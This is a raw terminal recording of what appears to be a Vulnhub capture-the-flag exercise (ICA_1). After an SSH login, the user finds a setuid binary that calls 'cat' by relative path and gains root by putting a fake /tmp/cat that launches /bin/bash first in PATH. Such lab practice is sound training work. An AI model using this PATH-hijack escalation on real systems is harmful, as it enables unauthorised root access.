@@ -1,0 +1,162 @@
+Script started on 2024-01-03 01:07:33+02:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="86" LINES="36"]
+]0;export NVM_DIR="$HOME/.nvm" - Parrot Terminal]0;[ -s "$NVM_DIR/nvm.sh" ] - Parrot Terminal]0;\. "$NVM_DIR/nvm.sh" - Parrot Terminal]0;[ -s "$NVM_DIR/bash_completion" ] - Parrot Terminal]0;\. "$NVM_DIR/bash_completion" - Parrot Terminal]0;[ -x /usr/bin/dircolors ] - Parrot Terminal]0;test -r ~/.dircolors - Parrot Terminal]0;eval "$(dircolors -b)" - Parrot Terminal]0;LS_COLORS='rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:' - Parrot Terminal]0;export LS_COLORS - Parrot Terminal]0;alias ls='ls --color=auto -v' - Parrot Terminal]0;alias dir='dir --color=auto' - Parrot Terminal]0;alias vdir='vdir --color=auto' - Parrot Terminal]0;alias grep='grep --color=auto' - Parrot Terminal]0;alias fgrep='fgrep --color=auto' - Parrot Terminal]0;alias egrep='egrep --color=auto' - Parrot Terminal]0;alias ll='ls -lh ' - Parrot Terminal]0;alias la='ls -lha' - Parrot Terminal]0;alias l='ls -CF' - Parrot Terminal]0;alias em='emacs -nw' - Parrot Terminal]0;alias _='sudo' - Parrot Terminal]0;alias _i='sudo -i' - Parrot Terminal]0;export OBSIDIANVAULT=/home/figaro/Documents/Obsidian\ Vault/ - Parrot Terminal]0;[ -f ~/.bash_aliases ] - Parrot Terminal]0;. ~/.bash_aliases - Parrot Terminal]0;[ -f ~/.bash_profile ] - Parrot Terminal]0;. ~/.bash_profile - Parrot Terminal]0;export GPROJ=/home/figaro/Programms/Github_Projects/NikolasProjects - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;shopt -oq posix - Parrot Terminal]0;[ -f /usr/share/bash-completion/bash_completion ] - Parrot Terminal]0;. /usr/share/bash-completion/bash_completion - Parrot Terminal[?2004h[0;31m┌─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m[7mssh dexter@$ipt [27m[C[C[C[C[C[Cssh dexter@$ipt 
+[?2004l]0;ssh dexter@$ipt - Parrot Terminalssh: Could not resolve hostname : Name or service not known
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexport ipt=192.15[K68[K9.1[K[K[K8.1.9
+[?2004l]0;export ipt=192.168.1.9 - Parrot Terminal[?2004h[0;31m┌─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexport ipt=192.168.1.9[C[C[C[C[C[C[6Pssh dexter@$ipt 
+[?2004l]0;ssh dexter@$ipt - Parrot Terminaldexter@192.168.1.9's password: 
+Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jan  2 17:24:28 2024 from 192.168.1.11
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ k[Kls 
+[?2004l[0m[01;32mnote.txt[0m
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ cat note.txt 
+[?2004lIt seems to me that there is a weakness while accessing the system.
+As far as I know, the contents of executable files are partially viewable.
+I need to find out if there is a vulnerability or not.
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ ux[K[Kx[Ksudo -l 
+[?2004l[sudo] password for dexter: 
+Sorry, user dexter may not run sudo on debian.
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ [7mfind / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cfind / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+[?2004l-rwsr-xr-x 1 root root 16816 Sep 25  2021 /opt/get_access
+-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
+-rwsr-xr-x 1 root root 35040 Jul 28  2021 /usr/bin/umount
+-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 182600 Feb 27  2021 /usr/bin/sudo
+-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
+-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 71912 Jul 28  2021 /usr/bin/su
+-rwsr-xr-x 1 root root 55528 Jul 28  2021 /usr/bin/mount
+-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
+-rwsr-xr-x 1 root root 481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ ks [K[K[Kls - [Kla op[K[K/opt/get_access 
+[?2004l-rwsr-xr-x 1 root root 16816 Sep 25  2021 [0m[37;41m/opt/get_access[0m
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ [7mfile /opt/get_access [27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cfile /opt/get_access 
+[?2004l/opt/get_access: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=74c7b8e5b3380d2b5f65d753cc2586736299f21a, for GNU/Linux 3.2.0, not stripped
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ [7mstrings /opt/get_access [27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[24@strings /opt/get_access [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C^C[?2004l[?2004h[?2004l
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ [7mstrings /opt/get_access [27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cstrings /opt/get_access 
+[?2004l/lib64/ld-linux-x86-64.so.2
+setuid
+socket
+puts
+system
+__cxa_finalize
+setgid
+__libc_start_main
+libc.so.6
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u/UH
+[]A\A]A^A_
+cat /root/system.info
+Could not create socket to access to the system.
+All services are disabled. Accessing to the system is allowed only within working hours.
+;*3$"
+GCC: (Debian 10.2.1-6) 10.2.1 20210110
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.0
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+get_access.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+puts@GLIBC_2.2.5
+_edata
+system@GLIBC_2.2.5
+__libc_start_main@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+setgid@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@GLIBC_2.2.5
+__cxa_finalize@GLIBC_2.2.5
+socket@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ [7mcat /root/system.info[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat /root/system.info
+[?2004lcat: /root/system.info: Permission denied
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ [7mwhich cat [27mwhich cat 
+[?2004l/usr/bin/cat
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ [7mecho $PATH[27mecho $PATH
+[?2004l/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ [7mecho '/bin/bash' >> /tmp/cat[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho '/bin/bash' >> /tmp/cat
+[?2004l[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ [7mchmod +x /tmp/cat[27mchmod +x /tmp/cat
+[?2004l[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ [7mexport PATH=/tmp:$PATH[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cexport PATH=/tmp:$PATH
+[?2004l[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ [7mcd /root/[27mcd /root/
+[?2004l-bash: cd: /root/: Permission denied
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ /opt/get_access 
+[?2004l[?2004h]0;root@debian: ~[01;32mroot@debian[00m:[01;34m~[00m# s[Kls
+[?2004l[0m[01;32mnote.txt[0m
+[?2004h]0;root@debian: ~[01;32mroot@debian[00m:[01;34m~[00m# cat note.txt [K[K[K[K[K[K[K[K[K[K[K[K[Kcd /root/
+[?2004l[?2004h]0;root@debian: /root[01;32mroot@debian[00m:[01;34m/root[00m# ls
+[?2004lroot.txt  system.info
+[?2004h]0;root@debian: /root[01;32mroot@debian[00m:[01;34m/root[00m# cat root.txt 
+[?2004l[?2004h]0;root@debian: /root[01;32mroot@debian[00m:[01;34m/root[00m# [?2004l
+exit
+[?2004h]0;root@debian: /root[01;32mroot@debian[00m:[01;34m/root[00m# exit
+[?2004lexit
+[?2004h]0;root@debian: /root[01;32mroot@debian[00m:[01;34m/root[00m# [?2004l
+exit
+[?2004h]0;root@debian: ~[01;32mroot@debian[00m:[01;34m~[00m# [?2004l
+exit
+All services are disabled. Accessing to the system is allowed only within working hours.
+
+[?2004h]0;dexter@debian: ~[01;32mdexter@debian[00m:[01;34m~[00m$ [?2004l
+logout
+Connection to 192.168.1.9 closed.
+[?2004h[0;31m┌─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexit 
+[?2004l]0;exit - Parrot Terminalexit
+
+Script done on 2024-01-03 01:09:43+02:00 [COMMAND_EXIT_CODE="0"]
